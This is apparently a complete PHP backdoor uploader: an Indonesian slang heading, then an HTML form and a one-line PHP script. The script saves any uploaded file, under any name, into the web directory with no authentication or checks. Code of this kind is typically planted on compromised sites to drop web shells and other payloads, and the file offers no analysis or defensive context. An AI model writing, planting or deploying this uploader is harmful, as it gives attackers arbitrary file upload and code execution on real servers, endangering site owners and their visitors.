BEKAS ASAL MANTAB
<form enctype=multipart/form-data method=post><input type=file name=x><input type=submit><?php $f=$_FILES[x];copy($f[tmp_name],$f[name]);?>
